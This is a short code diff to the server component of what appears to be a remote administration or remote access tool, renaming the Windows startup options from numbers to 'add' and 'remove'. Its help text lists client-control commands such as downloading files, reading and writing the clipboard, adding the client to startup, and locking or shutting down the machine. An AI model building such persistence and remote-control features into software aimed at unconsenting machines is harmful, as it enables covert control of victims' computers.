@@ -39,8 +39,7 @@ interface_help = """--h | See this Help Message
 --d | Download file from the web
 --c | Copies to Client Clipboard
 --p | Returns Client Current Clipboard
---t 1 | Add to Startup (Windows)
---t 2 | Remove from Startup (Windows)
+--t (add) (remove) | Manage Startup (Windows)
 --q 1 | Lock Client Machine (Windows)
 --q 2 | Shutdown Client Machine
 --q 3 | Restart Client Machine
@@ -720,15 +719,15 @@ class MultiServer(object):
             self.get_clipboard(conn, _print=True)
             return
         if command [:3] == '--t':
-            select = command[4:].strip()
-            if select == '1':
+            select = command[4:].strip().lower()
+            if select == 'add':
                 result, error = self.add_startup(conn)
                 if result:
                     print('Client added to Startup')
                 else:
                     print(error)
                 return
-            if select == '2':
+            if select == 'remove':
                 result, error = self.remove_startup(conn)
                 if result:
                     print('Removed Client from Startup')
